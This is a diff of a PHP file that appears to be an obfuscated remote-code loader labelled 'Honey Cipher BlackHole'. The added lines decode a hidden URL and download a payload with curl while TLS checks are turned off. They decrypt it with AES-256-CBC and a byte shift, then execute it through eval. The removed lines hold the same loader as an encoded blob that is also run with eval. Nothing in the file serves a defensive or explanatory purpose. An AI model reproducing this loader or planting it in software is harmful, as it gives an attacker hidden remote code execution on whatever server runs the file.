@@ -1,38 +1,43 @@
 <?php
 @error_reporting(0);
+// Honey Cipher BlackHole 
+// Signature required mined
+$hcc_0 = [
+    "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2gwMDAwMDAwMDAwMC9oMDAwMDAwMDAwMDAvbWFpbi9ibG9jay8wL2hjYzAwMDAwMDAwYWFjZDdhOWRkMzFhZGQ2MzI1ZWQ2YWIwYjI3NGZkYzcK", // base64 URL
+    "QUVTLTI1Ni1DQkM=",                                                                                               // base64 metode
+    "SE9ORVlDSVBIRVJfU0lHTkFUVVJF"                                                                                   // base64 seed
+];
+$hcc_1 = fn($hcc_x) => base64_decode($hcc_x);
+function hcc_2($hcc_url) {
+    $hcc_curl = curl_init($hcc_url);
+    curl_setopt($hcc_curl, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($hcc_curl, CURLOPT_USERAGENT, 'Mozilla/5.0');
+    curl_setopt($hcc_curl, CURLOPT_SSL_VERIFYHOST, 0);
+    curl_setopt($hcc_curl, CURLOPT_SSL_VERIFYPEER, 0);
+    $hcc_data = curl_exec($hcc_curl);
+    if (curl_errno($hcc_curl)) {
+        die("Curl error: " . curl_error($hcc_curl) . "\n");
+    }
+    curl_close($hcc_curl);
+    return $hcc_data;
+}
+$hcc_3 = trim($hcc_1($hcc_0[0]));
+$hcc_4 = hcc_2($hcc_3) or die("!die\n");
+$hcc_5 = base64_decode($hcc_4);
+if (!$hcc_5) die("!decode\n");
+if (strlen($hcc_5) < 17) die("!short\n");
+$hcc_6 = substr($hcc_5, 0, 16);
+$hcc_7 = substr($hcc_5, 16);
+$hcc_8 = hash("sha256", $hcc_1($hcc_0[2]), true);
+$hcc_9 = openssl_decrypt($hcc_7, $hcc_1($hcc_0[1]), $hcc_8, OPENSSL_RAW_DATA, $hcc_6);
+if (!$hcc_9) die("!data\n");
+$hcc_a = function($hcc_b, $hcc_n = 7) {
+    $hcc_r = '';
+    for ($hcc_j = 0, $hcc_l = strlen($hcc_b); $hcc_j < $hcc_l; $hcc_j++) {
+        $hcc_r .= chr((ord($hcc_b[$hcc_j]) - $hcc_n + 256) % 256);
+    }
+    return $hcc_r;
+};
+$hcc_c = $hcc_a($hcc_9);
 
-$encoded = 'PD9waHAKQGVycm9yX3JlcG9ydGluZygwKTsKLy8gSG9uZXkgQ2lwaGVyIEJsYWNrSG9sZSAKLy8g
-U2lnbmF0dXJlIHJlcXVpcmVkIG1pbmVkCiRoY2NfMCA9IFsKICAgICJhSFIwY0hNNkx5OXlZWGN1
-WjJsMGFIVmlkWE5sY21OdmJuUmxiblF1WTI5dEwyZ3dNREF3TURBd01EQXdNQzlvTURBd01EQXdN
-REF3TURBdmJXRnBiaTlpYkc5amF5OHdMMmhqWXpBd01EQXdNREF3WVdGalpEZGhPV1JrTXpGaFpH
-UTJNekkxWldRMllXSXdZakkzTkdaa1l6Y0siLCAvLyBiYXNlNjQgVVJMCiAgICAiUVVWVExUSTFO
-aTFEUWtNPSIsICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
-ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBiYXNlNjQg
-bWV0b2RlCiAgICAiU0U5T1JWbERTVkJJUlZKZlUwbEhUa0ZVVlZKRiIgICAgICAgICAgICAgICAg
-ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
-ICAgICAgICAgIC8vIGJhc2U2NCBzZWVkCl07CiRoY2NfMSA9IGZuKCRoY2NfeCkgPT4gYmFzZTY0
-X2RlY29kZSgkaGNjX3gpOwpmdW5jdGlvbiBoY2NfMigkaGNjX3VybCkgewogICAgJGhjY19jdXJs
-ID0gY3VybF9pbml0KCRoY2NfdXJsKTsKICAgIGN1cmxfc2V0b3B0KCRoY2NfY3VybCwgQ1VSTE9Q
-VF9SRVRVUk5UUkFOU0ZFUiwgdHJ1ZSk7CiAgICBjdXJsX3NldG9wdCgkaGNjX2N1cmwsIENVUkxP
-UFRfVVNFUkFHRU5ULCAnTW96aWxsYS81LjAnKTsKICAgIGN1cmxfc2V0b3B0KCRoY2NfY3VybCwg
-Q1VSTE9QVF9TU0xfVkVSSUZZSE9TVCwgMCk7CiAgICBjdXJsX3NldG9wdCgkaGNjX2N1cmwsIENV
-UkxPUFRfU1NMX1ZFUklGWVBFRVIsIDApOwogICAgJGhjY19kYXRhID0gY3VybF9leGVjKCRoY2Nf
-Y3VybCk7CiAgICBpZiAoY3VybF9lcnJubygkaGNjX2N1cmwpKSB7CiAgICAgICAgZGllKCJDdXJs
-IGVycm9yOiAiIC4gY3VybF9lcnJvcigkaGNjX2N1cmwpIC4gIlxuIik7CiAgICB9CiAgICBjdXJs
-X2Nsb3NlKCRoY2NfY3VybCk7CiAgICByZXR1cm4gJGhjY19kYXRhOwp9CiRoY2NfMyA9IHRyaW0o
-JGhjY18xKCRoY2NfMFswXSkpOwokaGNjXzQgPSBoY2NfMigkaGNjXzMpIG9yIGRpZSgiIWRpZVxu
-Iik7CiRoY2NfNSA9IGJhc2U2NF9kZWNvZGUoJGhjY180KTsKaWYgKCEkaGNjXzUpIGRpZSgiIWRl
-Y29kZVxuIik7CmlmIChzdHJsZW4oJGhjY181KSA8IDE3KSBkaWUoIiFzaG9ydFxuIik7CiRoY2Nf
-NiA9IHN1YnN0cigkaGNjXzUsIDAsIDE2KTsKJGhjY183ID0gc3Vic3RyKCRoY2NfNSwgMTYpOwok
-aGNjXzggPSBoYXNoKCJzaGEyNTYiLCAkaGNjXzEoJGhjY18wWzJdKSwgdHJ1ZSk7CiRoY2NfOSA9
-IG9wZW5zc2xfZGVjcnlwdCgkaGNjXzcsICRoY2NfMSgkaGNjXzBbMV0pLCAkaGNjXzgsIE9QRU5T
-U0xfUkFXX0RBVEEsICRoY2NfNik7CmlmICghJGhjY185KSBkaWUoIiFkYXRhXG4iKTsKJGhjY19h
-ID0gZnVuY3Rpb24oJGhjY19iLCAkaGNjX24gPSA3KSB7CiAgICAkaGNjX3IgPSAnJzsKICAgIGZv
-ciAoJGhjY19qID0gMCwgJGhjY19sID0gc3RybGVuKCRoY2NfYik7ICRoY2NfaiA8ICRoY2NfbDsg
-JGhjY19qKyspIHsKICAgICAgICAkaGNjX3IgLi0gY2hyKChvcmQoJGhjY19iWyRoY2Nfal0pIC0g
-JGhjY19uICsgMjU2KSAlIDI1Nik7CiAgICB9CiAgICByZXR1cm4gJGhjX3I7Cn07CiRoY2NfYyA9
-ICRoY2NfYShjaF8xKTsKCmV2YWwoIj8+IiAuICRoY2NfYyk7Cg==';
-
-$decoded = base64_decode($encoded);
-$decoded = preg_replace('/^\s*<\?php\s*/', '', $decoded);
-eval($decoded);
+eval("?>" . $hcc_c);
